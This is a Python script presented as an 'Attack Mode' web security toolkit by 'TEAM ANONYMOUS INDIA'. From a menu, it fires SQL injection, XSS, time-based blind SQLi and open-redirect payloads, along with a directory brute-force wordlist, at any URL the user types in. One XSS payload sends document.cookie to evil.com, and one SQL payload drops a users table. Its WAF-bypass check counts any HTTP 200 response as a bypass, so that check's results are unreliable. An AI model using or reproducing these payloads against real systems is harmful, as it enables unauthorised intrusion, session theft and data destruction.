import requests
from colorama import Fore, Style, init
import time
import random

# Initialize colorama for Windows compatibility
init(autoreset=True)

# Print banner with intense, stylish colors and effects
def print_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}
████████╗███████╗██╗  ██╗████████╗███████╗███████╗
╚══██╔══╝██╔════╝██║  ██║╚══██╔══╝██╔════╝██╔════╝
   ██║   █████╗  ███████║   ██║   █████╗  █████╗  
   ██║   ██╔══╝  ██╔══██║   ██║   ██╔══╝  ██╔══╝  
   ██║   ███████╗██║  ██║   ██║   ███████╗███████╗
   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝

   {Fore.LIGHTGREEN_EX}Made By TEAM ANONYMOUS INDIA
   {Fore.YELLOW}Web App Security Tools - Attack Mode
{Style.RESET_ALL}
"""
    print(banner)

# Enhanced error handler with vibrant colors
def safe_request(url, params=None, allow_redirects=True, timeout=5):
    try:
        return requests.get(url, params=params, allow_redirects=allow_redirects, timeout=timeout)
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[ERROR] Request timed out. Skipping...{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[ERROR] Connection error. Check the URL or your network.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")
    return None

# Tool 1: WAF Bypass Tester with Advanced Payloads
def waf_bypass_tester():
    print(f"{Fore.CYAN}[INFO] Running WAF Bypass Tester...{Style.RESET_ALL}")
    url = input(f"{Fore.GREEN}Enter the URL to test WAF: {Style.RESET_ALL}")
    payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT NULL, NULL --", 
        "<img src=x onerror=alert(1)>", 
        "'; DROP TABLE users; --",
        "' OR 1=1#",
        "' AND 1=1 UNION SELECT 1,2,3 --"
    ]
    for payload in payloads:
        response = safe_request(url, params={"input": payload})
        if response and response.status_code == 200:
            print(f"{Fore.GREEN}[+] WAF bypassed with payload: {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] WAF blocked payload: {payload}{Style.RESET_ALL}")

# Tool 2: XSS Vulnerability Scanner with Advanced Techniques
def xss_vulnerability_scanner():
    print(f"{Fore.CYAN}[INFO] Running XSS Vulnerability Scanner...{Style.RESET_ALL}")
    url = input(f"{Fore.GREEN}Enter the URL to test for XSS: {Style.RESET_ALL}")
    xss_payloads = [
        "<script>alert(1)</script>", 
        "<img src=x onerror=alert(1)>", 
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<script>fetch('http://evil.com?cookie=' + document.cookie)</script>"
    ]
    for payload in xss_payloads:
        response = safe_request(url, params={"input": payload})
        if response and payload in response.text:
            print(f"{Fore.GREEN}[+] XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No XSS vulnerability found with payload: {payload}{Style.RESET_ALL}")

# Tool 3: Directory Brute Forcing with Larger Wordlist
def web_directory_brute_forcer():
    print(f"{Fore.CYAN}[INFO] Running Web Directory Brute Forcer...{Style.RESET_ALL}")
    url = input(f"{Fore.GREEN}Enter the target URL for directory brute-forcing: {Style.RESET_ALL}")
    wordlist = [
        "admin", "login", "dashboard", "backup", "uploads", "config", "private", "images", 
        "docs", "test", "scripts", "panel", "api", "data", "management"
    ]
    for word in wordlist:
        test_url = f"{url}/{word}"
        response = safe_request(test_url)
        if response and response.status_code == 200:
            print(f"{Fore.GREEN}[+] Found directory: {test_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No directory found at: {test_url}{Style.RESET_ALL}")

# Tool 4: Blind SQL Injection Detection (Time-Based)
def blind_sql_injection_test():
    print(f"{Fore.CYAN}[INFO] Running Blind SQL Injection Test...{Style.RESET_ALL}")
    url = input(f"{Fore.GREEN}Enter the URL to test for Blind SQL Injection: {Style.RESET_ALL}")
    payloads = [
        "' AND SLEEP(5)--", 
        "' OR 1=1 --", 
        "' AND 1=1 AND BENCHMARK(1000000,MD5(1)) --",
        "'; WAITFOR DELAY '0:0:5' --"
    ]
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        start = time.time()
        response = safe_request(test_url)
        end = time.time()
        if response and (end - start) > 5:
            print(f"{Fore.GREEN}[+] Blind SQL Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No Blind SQL Injection vulnerability found with payload: {payload}{Style.RESET_ALL}")

# Tool 5: Open Redirect Detection with More Payloads
def open_redirect_detector():
    print(f"{Fore.CYAN}[INFO] Running Open Redirect Detector...{Style.RESET_ALL}")
    url = input(f"{Fore.GREEN}Enter the URL to test for Open Redirect: {Style.RESET_ALL}")
    redirect_payloads = [
        "http://evil.com", "//evil.com", "/%5c..%5cevil.com", "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>"
    ]
    for payload in redirect_payloads:
        test_url = f"{url}?redirect={payload}"
        response = safe_request(test_url, allow_redirects=False)
        if response and response.status_code in [301, 302] and "evil.com" in response.headers.get("Location", ""):
            print(f"{Fore.GREEN}[+] Open Redirect detected with payload: {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No Open Redirect with payload: {payload}{Style.RESET_ALL}")

# Tool 6: URL Shortener Resolver (Detects Redirects)
def url_shortener_resolver():
    print(f"{Fore.CYAN}[INFO] Running URL Shortener Resolver...{Style.RESET_ALL}")
    short_url = input(f"{Fore.GREEN}Enter the shortened URL: {Style.RESET_ALL}")
    try:
        response = requests.head(short_url, allow_redirects=True, timeout=5)
        print(f"{Fore.GREEN}[+] Shortened URL resolves to: {response.url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")

# Main menu with colorful options
def main():
    print_banner()
    while True:
        print(f"{Fore.LIGHTYELLOW_EX}Choose a tool to run:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. Web Application Firewall (WAF) Bypass Tester")
        print(f"{Fore.CYAN}2. XSS Vulnerability Scanner")
        print(f"{Fore.CYAN}3. Web Directory Brute Forcer")
        print(f"{Fore.CYAN}4. Blind SQL Injection Tester (Time-Based)")
        print(f"{Fore.CYAN}5. Open Redirect Detector")
        print(f"{Fore.CYAN}6. URL Shortener Resolver")
        print(f"{Fore.RED}0. Exit{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}Enter your choice: {Style.RESET_ALL}")
        if choice == "1":
            waf_bypass_tester()
        elif choice == "2":
            xss_vulnerability_scanner()
        elif choice == "3":
            web_directory_brute_forcer()
        elif choice == "4":
            blind_sql_injection_test()
        elif choice == "5":
            open_redirect_detector()
        elif choice == "6":
            url_shortener_resolver()
        elif choice == "0":
            print(f"{Fore.YELLOW}Exiting... Stay safe!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}[ERROR] Invalid choice. Please try again.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
